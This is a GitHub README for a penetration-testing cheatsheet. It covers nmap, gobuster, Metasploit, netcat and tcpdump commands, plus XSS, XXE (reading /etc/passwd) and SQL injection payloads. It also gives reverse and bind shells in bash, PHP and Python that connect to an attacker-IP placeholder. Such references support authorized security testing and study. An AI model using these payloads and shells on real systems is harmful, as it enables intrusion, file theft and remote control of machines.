
# Penooo-Cheatsheet for Pentesting

A collection of **useful commands and scripts** for pentesting tools, organized by the specific tools used. This repository serves as a handy reference for commonly used tools and their commands, making your pentesting tasks faster and more efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Tool-Based Commands](#tool-based-commands)
  - [Nmap](#nmap)
  - [Gobuster](#gobuster)
  - [Metasploit](#metasploit)
  - [Netcat](#netcat)
  - [SearchSploit](#searchsploit)
  - [TCPDump](#tcpdump)
- [Payloads](#payloads)
  - [XSS Payloads](#xss-payloads)
  - [XML Payloads](#xml-payloads)
  - [SQL Payloads](#sql-payloads)
  - [Other Payloads](#other-payloads)
- [Shells](#shells)
  - [Reverse Shells](#reverse-shells)
  - [Bind Shells](#bind-shells)
- [Useful Resources](#useful-resources)
  - [Payloads and Exploits](#payloads-and-exploits)
  - [Pentesting Guides](#pentesting-guides)
  - [Security Tools](#security-tools)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Comprehensive list of commands for various pentesting tools
- Pre-written scripts for automating common activities
- Beginner-friendly and updated with modern techniques

---

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/<your-username>/cheatsheet-pentesting.git
```

Navigate to the directory:

```bash
cd cheatsheet-pentesting
```

---

## Usage

1. Browse through the tool categories to find relevant commands or scripts.
2. Use the provided commands directly in your terminal.
3. For scripts, make them executable if needed:

   ```bash
   chmod +x <script-name>.sh
   ./<script-name>.sh
   ```

4. Customize the scripts based on your specific target or environment.

---

## Tool-Based Commands

### Nmap
- **Basic Scan**:
  ```bash
  nmap -sV -A <target-IP>
  ```

- **Scan Specific Ports**:
  ```bash
  nmap -p 80,443 <target-IP>
  ```

- **OS Detection**:
  ```bash
  nmap -O <target-IP>
  ```

### Gobuster
- **Directory Enumeration**:
  ```bash
  gobuster dir -u http://<target> -w /path/to/wordlist.txt
  ```

- **DNS Subdomain Enumeration**:
  ```bash
  gobuster dns -d <target-domain> -w /path/to/wordlist.txt
  ```

### Metasploit
- **Start Metasploit Console**:
  ```bash
  msfconsole
  ```

- **Search for Exploits**:
  ```bash
  search <exploit-name>
  ```

- **Use an Exploit**:
  ```bash
  use <exploit-path>
  ```

### Netcat
- **Set Up a Listener**:
  ```bash
  nc -lvnp 4444
  ```

- **Send a File**:
  ```bash
  nc -w 3 <target-IP> 1234 < file.txt
  ```

- **Reverse Shell**:
  ```bash
  bash -i >& /dev/tcp/<your-IP>/4444 0>&1
  ```

### SearchSploit
- **Search for Exploits**:
  ```bash
  searchsploit <software-name>
  ```

- **Copy Exploit to Current Directory**:
  ```bash
  searchsploit -m <exploit-path>
  ```

### TCPDump
- **Capture Traffic on an Interface**:
  ```bash
  tcpdump -i <interface>
  ```

- **Write Capture to File**:
  ```bash
  tcpdump -i <interface> -w capture.pcap
  ```

- **Filter by Port**:
  ```bash
  tcpdump -i <interface> port 80
  ```

---

## Payloads

### XSS Payloads
- **Basic XSS Test**:
  ```html
  <script>alert('XSS');</script>
  ```

- **XSS in Image Tag**:
  ```html
  <img src=x onerror=alert('XSS')>
  ```

### XML Payloads
- **XML External Entity (XXE) Injection**:
  ```xml
  <!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  ```

- **XML Injection**:
  ```xml
  <user><name>admin' or '1'='1</name></user>
  ```

### SQL Payloads
- **Basic SQL Injection**:
  ```sql
  ' OR 1=1 --
  ```

- **Blind SQL Injection**:
  ```sql
  ' AND IF(1=1,SLEEP(5),0)--
  ```

### Other Payloads
- **PHP Reverse Shell**:
  ```php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1'"); ?>
  ```

- **Python Reverse Shell**:
  ```python
  import socket, subprocess, os
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("<attacker-IP>",<port>))
  os.dup2(s.fileno(), 0)
  os.dup2(s.fileno(), 1)
  os.dup2(s.fileno(), 2)
  subprocess.call(["/bin/sh","-i"])
  ```

---

## Shells

### Reverse Shells
- **Netcat Reverse Shell**:
  ```bash
  nc -e /bin/bash <attacker-IP> <port>
  ```

- **Python Reverse Shell**:
  ```bash
  python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<attacker-IP>",<port>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
  ```

### Bind Shells
- **Netcat Bind Shell**:
  ```bash
  nc -lvnp <port> -e /bin/bash
  ```

- **Python Bind Shell**:
  ```bash
  python3 -c 'import socket,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.bind(("0.0.0.0",<port>)); s.listen(1); conn, addr = s.accept(); os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2); os.system("/bin/sh")'
  ```

---

## Useful Resources

### Payloads and Exploits
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): A comprehensive collection of payloads.
- [GTFOBins](https://gtfobins.github.io/): A curated list of Unix binaries that can be exploited by pentesters.
- [Exploit-DB](https://www.exploit-db.com/): A database of public exploits and proof-of-concepts.
- [OWASP Top 10](https://owasp.org/www-project-top-ten/): A list of the top 10 security risks.

### Pentesting Guides
- [HackTricks](https://book.hacktricks.xyz/): A handbook with tips and tricks for pentesting.
- [PentesterLab](https://www.pentesterlab.com/): A platform offering a variety of web application and pentesting exercises.
- [Hack The Box](https://www.hackthebox.eu/): A platform for pentesting challenges and exercises.

### Security Tools
- [Burp Suite](https://portswigger.net/burp): A popular web vulnerability scanner and proxy tool.
- [Nikto](https://cirt.net/Nikto2): A web server scanner to find potential vulnerabilities.
- [Wireshark](https://www.wireshark.org/): A network protocol analyzer used for packet inspection.

---

## Contributing

Contributions are welcome! If you have additional useful commands or scripts, feel free to create a pull request:

1. Fork this repository.
2. Create a new branch:
   ```bash
   git checkout -b feature/add-new-commands
   ```
3. Commit your changes:
   ```bash
   git commit -m "Add new commands for XYZ"
   ```
4. Push to your branch:
   ```bash
   git push origin feature/add-new-commands
   ```
5. Open a pull request on GitHub.

---

## License

This project is licensed under the [MIT License](LICENSE).
